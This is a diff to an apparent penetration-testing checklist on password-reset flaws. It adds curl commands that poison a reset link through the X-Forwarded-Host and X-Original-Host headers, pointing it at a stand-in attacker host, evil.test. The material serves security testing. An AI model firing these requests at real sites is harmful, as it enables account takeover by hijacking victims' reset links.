@@ -91,6 +91,9 @@ chains_with: [idor, jwt, csrf, race-condition]
    ```bash
    # host-header poisoning of the reset link (if the app builds the link from the Host header)
    curl -s -X POST https://target/password/reset -H "Host: evil.test" -d "email=victim@test.local"
+   # also test proxy headers — many frameworks trust X-Forwarded-Host even when Host is locked:
+   curl -s -X POST https://target/password/reset -H "X-Forwarded-Host: evil.test" -d "email=victim@test.local"
+   curl -s -X POST https://target/password/reset -H "X-Original-Host: evil.test" -d "email=victim@test.local"
    # check the generated email/link (via a test mailbox you control) for evil.test in the link
 
    # token predictability — request two resets in quick succession, compare token structure
